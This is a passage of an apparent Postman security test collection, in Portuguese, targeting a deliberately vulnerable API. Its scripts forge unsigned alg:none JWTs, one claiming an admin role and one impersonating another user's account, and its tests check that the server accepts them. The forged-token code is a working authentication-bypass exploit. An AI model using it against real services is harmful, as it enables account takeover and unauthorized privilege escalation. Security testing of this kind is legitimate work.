    {
      "name": "07 - JWT Forgery (assinatura nao verificada)",
      "item": [
        {
          "name": "Forjar ADMIN (alg:none, role=admin)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{forged_jwt}}"
              }
            ],
            "url": {
              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
              "host": [
                "{{base_url}}"
              ],
              "path": [
                "identity",
                "api",
                "v2",
                "user",
                "dashboard"
              ]
            },
            "description": "API2. Token alg:none sem assinatura, role=admin. O servidor nao verifica a assinatura."
          },
          "event": [
            {
              "listen": "prerequest",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "function b64url(str){var w=CryptoJS.enc.Utf8.parse(str);return CryptoJS.enc.Base64.stringify(w).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');}",
                  "var header = {alg:'none', typ:'JWT'};",
                  "var payload = {sub:'atacante@teste.local', role:'admin', iat:1700000000, exp:1999999999};",
                  "pm.collectionVariables.set('forged_jwt', b64url(JSON.stringify(header))+'.'+b64url(JSON.stringify(payload))+'.');"
                ]
              }
            },
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "pm.test('HTTP 200 - token forjado (alg:none) aceito', function(){ pm.response.to.have.status(200); });"
                ]
              }
            }
          ]
        },
        {
          "name": "Personificar outro usuario (alg:none, sub=adam007)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{forged_jwt}}"
              }
            ],
            "url": {
              "raw": "{{base_url}}/identity/api/v2/user/dashboard",
              "host": [
                "{{base_url}}"
              ],
              "path": [
                "identity",
                "api",
                "v2",
                "user",
                "dashboard"
              ]
            },
            "description": "API2. Mesmo truque com o sub de outro usuario: retorna o dashboard da vitima."
          },
          "event": [
            {
              "listen": "prerequest",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "function b64url(str){var w=CryptoJS.enc.Utf8.parse(str);return CryptoJS.enc.Base64.stringify(w).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');}",
                  "var header = {alg:'none', typ:'JWT'};",
                  "var payload = {sub:'adam007@example.com', role:'user', iat:1700000000, exp:1999999999};",
                  "pm.collectionVariables.set('forged_jwt', b64url(JSON.stringify(header))+'.'+b64url(JSON.stringify(payload))+'.');"
                ]
              }
            },
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "pm.test('HTTP 200 - token forjado (alg:none) aceito', function(){ pm.response.to.have.status(200); });"
                ]
              }
            }
          ]
